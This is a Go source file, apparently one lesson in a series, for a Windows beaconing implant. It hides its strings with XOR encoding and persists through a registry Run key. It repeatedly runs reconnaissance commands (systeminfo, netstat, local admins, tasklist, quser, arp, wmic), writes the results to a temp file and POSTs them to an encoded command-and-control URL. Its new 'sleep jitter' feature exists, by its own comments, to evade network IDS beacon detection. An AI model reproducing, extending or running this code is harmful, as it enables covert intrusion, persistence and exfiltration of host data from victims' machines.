package main

import (
	"bytes"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"time"
)

// ============================================================
// L08 — SLEEP JITTER
// What changed from v4:
//   The fixed time.Sleep(60 * time.Second) is replaced with
//   jitteredSleep(), which adds a random offset of ±20%.
//   This breaks the fixed inter-arrival pattern that network
//   IDS tools (Zeek, Suricata) use to detect beacons.
//
//   v3 beacon arrives: exactly every 60 seconds
//   v5 beacon arrives: anywhere between 48s and 72s
//
//   A fixed heartbeat is a network signature.
//   A variable heartbeat looks like normal web traffic.
// ============================================================

const xorKey byte = 0x5A

func decode(b []byte) string {
	out := make([]byte, len(b))
	for i, v := range b {
		out[i] = v ^ xorKey
	}
	return string(out)
}

// jitteredSleep pauses for base ± pct percent.
// Example: jitteredSleep(60s, 20) sleeps between 48s and 72s.
// The actual sleep duration is unpredictable from outside the binary.
func jitteredSleep(base time.Duration, pct int) {
	// Calculate maximum jitter window
	delta := int64(base) * int64(pct) / 100

	// Pick a random offset between -delta and +delta
	offset := rand.Int63n(delta*2) - delta

	actual := base + time.Duration(offset)
	fmt.Printf("Sleeping %v (base %v ±%d%%)\n", actual.Round(time.Second), base, pct)
	time.Sleep(actual)
}

// ============================================================
// Pre-encoded strings — identical to v4
// ============================================================

var encC2URL = []byte{
	0x32, 0x2e, 0x2e, 0x2a, 0x60, 0x75, 0x75, 0x6b, 0x63, 0x68,
	0x74, 0x6b, 0x6c, 0x62, 0x74, 0x6b, 0x74, 0x6b, 0x6a, 0x60,
	0x6f, 0x6a, 0x6a, 0x6a, 0x75, 0x38, 0x3f, 0x3b, 0x39, 0x35, 0x34,
}
var encRegPath = []byte{
	0x12, 0x11, 0x19, 0x0f, 0x06, 0x09, 0x35, 0x3c, 0x2e, 0x2d,
	0x3b, 0x28, 0x3f, 0x06, 0x17, 0x33, 0x39, 0x28, 0x35, 0x29,
	0x35, 0x3c, 0x2e, 0x06, 0x0d, 0x33, 0x34, 0x3e, 0x35, 0x2d,
	0x29, 0x06, 0x19, 0x2f, 0x28, 0x28, 0x3f, 0x34, 0x2e, 0x0c,
	0x3f, 0x28, 0x29, 0x33, 0x35, 0x34, 0x06, 0x08, 0x2f, 0x34,
}
var encRegName  = []byte{0x08, 0x3f, 0x39, 0x35, 0x34, 0x18, 0x3f, 0x3b, 0x39, 0x35, 0x34}
var encTempDir  = []byte{0x19, 0x60, 0x06, 0x2e, 0x3f, 0x37, 0x2a}
var encFilePath = []byte{
	0x19, 0x60, 0x06, 0x2e, 0x3f, 0x37, 0x2a, 0x06, 0x28, 0x3f,
	0x39, 0x35, 0x34, 0x05, 0x39, 0x35, 0x37, 0x38, 0x33, 0x34,
	0x3f, 0x3e, 0x74, 0x2e, 0x22, 0x2e,
}
var encFileName = []byte{
	0x28, 0x3f, 0x39, 0x35, 0x34, 0x05, 0x39, 0x35, 0x37, 0x38,
	0x33, 0x34, 0x3f, 0x3e, 0x74, 0x2e, 0x22, 0x2e,
}
var encSysinfo  = []byte{0x29, 0x23, 0x29, 0x2e, 0x3f, 0x37, 0x33, 0x34, 0x3c, 0x35}
var encNetstat  = []byte{0x34, 0x3f, 0x2e, 0x29, 0x2e, 0x3b, 0x2e, 0x7a, 0x77, 0x3b, 0x34, 0x35}
var encLocalgrp = []byte{
	0x34, 0x3f, 0x2e, 0x7a, 0x36, 0x35, 0x39, 0x3b, 0x36, 0x3d,
	0x28, 0x35, 0x2f, 0x2a, 0x7a, 0x3b, 0x3e, 0x37, 0x33, 0x34,
	0x33, 0x29, 0x2e, 0x28, 0x3b, 0x2e, 0x35, 0x28, 0x29,
}
var encTasklist = []byte{0x2e, 0x3b, 0x29, 0x31, 0x36, 0x33, 0x29, 0x2e, 0x7a, 0x75, 0x3c, 0x35, 0x7a, 0x39, 0x29, 0x2c}
var encQuser   = []byte{0x2b, 0x2f, 0x29, 0x3f, 0x28}
var encArp     = []byte{0x3b, 0x28, 0x2a, 0x7a, 0x77, 0x3b}
var encWmic    = []byte{
	0x2d, 0x37, 0x33, 0x39, 0x7a, 0x36, 0x35, 0x3d, 0x33, 0x39,
	0x3b, 0x36, 0x3e, 0x33, 0x29, 0x31, 0x7a, 0x3d, 0x3f, 0x2e,
	0x7a, 0x29, 0x33, 0x20, 0x3f, 0x76, 0x3c, 0x28, 0x3f, 0x3f,
	0x29, 0x2a, 0x3b, 0x39, 0x3f, 0x76, 0x39, 0x3b, 0x2a, 0x2e,
	0x33, 0x35, 0x34,
}

func main() {
	exePath, _ := os.Executable()

	regPath := decode(encRegPath)
	regName := decode(encRegName)
	persistCmd := fmt.Sprintf(`reg add "%s" /v %s /t REG_SZ /d "%s" /f`, regPath, regName, exePath)
	exec.Command("cmd", "/C", persistCmd).Run()

	c2URL := decode(encC2URL)

	for {
		os.MkdirAll(decode(encTempDir), 0755)
		timestamp := time.Now().Format("2006-01-02 15:04:05")
		var content string

		content += "=== RECONNAISSANCE REPORT ===\n"
		content += fmt.Sprintf("Generated: %s\n\n", timestamp)
		content += fmt.Sprintf("Beacon Cycle: %d\n\n", time.Now().Unix())

		content += "=== NETWORK INTERFACES ===\n"
		interfaces, _ := net.Interfaces()
		for _, i := range interfaces {
			addrs, _ := i.Addrs()
			content += fmt.Sprintf("Interface: %s (%v)\n", i.Name, addrs)
		}
		content += "\n"

		content += "=== SYSTEM INFORMATION ===\n"
		cmd := exec.Command("cmd", "/C", decode(encSysinfo))
		output, _ := cmd.Output()
		content += string(output) + "\n\n"

		content += "=== 1. NETWORK CONNECTIONS ===\n"
		cmd = exec.Command("cmd", "/C", decode(encNetstat))
		output, _ = cmd.Output()
		content += string(output) + "\n\n"

		content += "=== 2. LOCAL ADMINS ===\n"
		cmd = exec.Command("cmd", "/C", decode(encLocalgrp))
		output, _ = cmd.Output()
		content += string(output) + "\n\n"

		content += "=== 3. RUNNING PROCESSES ===\n"
		cmd = exec.Command("cmd", "/C", decode(encTasklist))
		output, _ = cmd.Output()
		content += string(output) + "\n\n"

		content += "=== 4. LOGGED-IN USERS ===\n"
		cmd = exec.Command("cmd", "/C", decode(encQuser))
		output, _ = cmd.Output()
		content += string(output) + "\n\n"

		content += "=== 5. ARP CACHE ===\n"
		cmd = exec.Command("cmd", "/C", decode(encArp))
		output, _ = cmd.Output()
		content += string(output) + "\n\n"

		content += "=== 6. DISK INFORMATION ===\n"
		cmd = exec.Command("cmd", "/C", decode(encWmic))
		output, _ = cmd.Output()
		content += string(output) + "\n\n"

		path := decode(encFilePath)
		os.WriteFile(path, []byte(content), 0644)

		hostname, _ := os.Hostname()
		sendToC2(c2URL, path, hostname, decode(encFileName))

		fmt.Printf("Beacon sent at %s.\n", timestamp)

		// Jittered sleep — ±20% of 60 seconds (48s to 72s)
		// Change the percentage to increase or decrease randomness.
		jitteredSleep(60*time.Second, 20)
	}
}

func sendToC2(url, filepath, hostID, filename string) {
	data, err := os.ReadFile(filepath)
	if err != nil {
		return
	}
	req, err := http.NewRequest("POST", url, bytes.NewReader(data))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("X-Filename", filename)
	req.Header.Set("X-Host", hostID)

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(resp.Body)
	fmt.Printf("C2 Response: %s\n", string(respBody))
}
